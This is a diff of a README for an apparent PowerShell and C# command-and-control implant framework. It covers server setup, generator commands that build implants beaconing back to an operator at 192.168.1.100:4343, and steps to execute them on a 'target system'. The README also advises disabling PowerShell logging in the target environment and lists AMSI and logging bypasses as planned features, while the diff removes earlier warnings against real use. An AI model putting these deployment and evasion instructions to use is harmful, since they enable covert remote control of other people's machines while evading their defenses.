@@ -1,16 +1,39 @@
-# Stage 0 PowerShell Implant
+NOTE: I'm blindly accepting AI's suggestions here. So, use at your own risk. I know, totally stupid - but what did ya expect? The world's on fire so man's gotta play when he can. 
+# Stage 0 PowerShell & C# Implant
 
-A lightweight, OPSEC-focused PowerShell implant with encrypted command and control communication.
-NOTE: AES keys are hardcoded. That's a signature!!! Not ready for your cool ass red team engagements. 
+A lightweight, OPSEC-focused PowerShell and C# implant with encrypted command and control communication.
 
+## Python Requirements & Setup
+
+Install dependencies with:
+
+```bash
+pip install -r requirements.txt
+```
 
 ## Features
 
 - **Encrypted Communication**: AES-256-CBC encryption for all C2 traffic
 - **Session Management**: Multi-session support with easy switching
-- **PowerShell Integration**: Native PowerShell command execution
+- **PowerShell & C# Integration**: Native PowerShell and C# command execution
 - **OPSEC-Safe**: In-memory execution, minimal process creation
 - **Simple Interface**: Clean operator interface without complex prefixes
+
+## Supported Implant Languages
+
+- PowerShell (`.ps1`)
+- C# (`.cs`)
+
+## AES Key and IV Format
+
+- **AES-256 key**: 32 bytes (64 hex characters)
+- **IV**: 16 bytes (32 hex characters)
+
+Example:
+```json
+"key": "43c1ed161272e682fb0022a6be82997b43c1ed161272e682fb0022a6be82997b",
+"iv":  "a14fefa11652f54a05d97e22b4759517"
+```
 
 ## Components
 
@@ -20,8 +43,9 @@ NOTE: AES keys are hardcoded. That's a signature!!! Not ready for your cool ass 
 - Interactive operator interface
 - Session logging to `stage0_logs/` directory
 
-### Implant (`implant.ps1`)
-- PowerShell-based implant
+### Implants
+- PowerShell-based implant (`.ps1`)
+- C#-based implant (`.cs`)
 - AES-256-CBC encrypted communication
 - In-memory command execution
 - Automatic reconnection handling
@@ -30,7 +54,7 @@ NOTE: AES keys are hardcoded. That's a signature!!! Not ready for your cool ass 
 
 ### Prerequisites
 ```bash
-pip install -r requirements.txt
+pip install pycryptodome prompt_toolkit
 ```
 
 ### Server Setup
@@ -44,18 +68,10 @@ python3 server.py 0.0.0.0 4343
 ```
 
 ### Implant Deployment
-1. Modify the server IP and port in `implant.ps1`:
-   ```powershell
-   param(
-       [string]$server = "YOUR_SERVER_IP",
-       [int]$port = 4343
-   )
-   ```
-
+1. Modify the server IP and port in the generated implant if needed.
 2. Deploy to target system and execute:
-   ```powershell
-   .\implant.ps1
-   ```
+   - PowerShell: `./implant_powershell.ps1`
+   - C#: Compile and run the `.cs` file on the target.
 
 ## Usage
 
@@ -112,7 +128,7 @@ Ethernet adapter Ethernet:
 ## OPSEC Considerations
 
 ### Strengths
-- **In-memory execution**: Most commands run in PowerShell memory space
+- **In-memory execution**: Most commands run in PowerShell or C# memory space
 - **No process creation**: Commands don't spawn new processes (except CMD)
 - **Encrypted communication**: All traffic is AES-256-CBC encrypted
 - **Session persistence**: Maintains connection across command execution
@@ -121,7 +137,7 @@ Ethernet adapter Ethernet:
 - **PowerShell logging**: Commands may be logged by ScriptBlock logging
 - **AMSI scanning**: Commands are scanned by Anti-Malware Scan Interface
 - **Network traffic**: Encrypted but detectable as unusual traffic
-- **Process behavior**: PowerShell process with network activity
+- **Process behavior**: PowerShell or C# process with network activity
 
 ### Mitigation Strategies
 - **Disable PowerShell logging** in target environment
@@ -135,10 +151,6 @@ The project includes a generator script that can create implants in PowerShell a
 
 > **Note:** All generated implants and their config files are now placed in the `implants/` directory.
 
-### Supported Languages
-- **PowerShell** (`.ps1`) - Full-featured implant with OPSEC-safe commands
-- **C#** (`.cs`) - Compiled .NET implant
-
 ### Usage
 
 ```bash
@@ -146,7 +158,7 @@ The project includes a generator script that can create implants in PowerShell a
 python3 generator.py powershell --server 192.168.1.100 --port 4343
 
 # Generate C# implant with custom keys (output in implants/)
-python3 generator.py csharp --server 192.168.1.100 --port 4343 --key 43c1ed161272e682fb0022a6be82997b --iv a14fefa11652f54a05d97e22b4759517
+python3 generator.py csharp --server 192.168.1.100 --port 4343 --key 43c1ed161272e682fb0022a6be82997b43c1ed161272e682fb0022a6be82997b --iv a14fefa11652f54a05d97e22b4759517
 
 # Generate both PowerShell and C# implants with the same keys (output in implants/)
 python3 generator.py all --server 192.168.1.100 --port 4343
@@ -163,7 +175,7 @@ python3 generator.py powershell --server 192.168.1.100 --port 4343 --no-update-s
 {
   "server": "192.168.1.100",
   "port": 4343,
-  "key": "43c1ed161272e682fb0022a6be82997b",
+  "key": "43c1ed161272e682fb0022a6be82997b43c1ed161272e682fb0022a6be82997b",
   "iv": "a14fefa11652f54a05d97e22b4759517"
 }
 ```
@@ -184,28 +196,9 @@ stage0/
 └── README.md              # This file
 ```
 
-## Features
-- Encrypted C2 communication (AES-256-CBC)
-- PowerShell and C# implant generation
-- OPSEC-safe `whoami` and `hostname` commands
-- In-memory command execution (PowerShell)
-- Session management (list, switch, kill, log)
-- Clean operator interface
-- Configurable keys and server settings
-
-## OPSEC Considerations
-- Hardcoded keys are a signature; not suitable for real red team engagements
-- PowerShell logging, AMSI, and network traffic are detection vectors
-- No process creation except for `CMD` commands
-- OPSEC-safe user and host info via environment variables
-
-## Security Notes
-- Do not use hardcoded keys in real operations
-- Consider implementing key management and logging bypasses for advanced OPSEC
-
 ## Troubleshooting
-- If you see `[!] Failed to decode/decrypt incoming data` on the server, ensure the implant and server are using the same keys and protocol
-- Only PowerShell and C# implants are supported
+- If you see `[!] Failed to decode/decrypt incoming data` on the server, ensure the implant and server are using the same 32-byte (64 hex char) AES key and 16-byte (32 hex char) IV, and that both were generated at the same time.
+- Only PowerShell and C# implants are supported.
 
 ## Wishlist
 - [ ] Advanced OPSEC features (AMSI bypass, logging bypass)
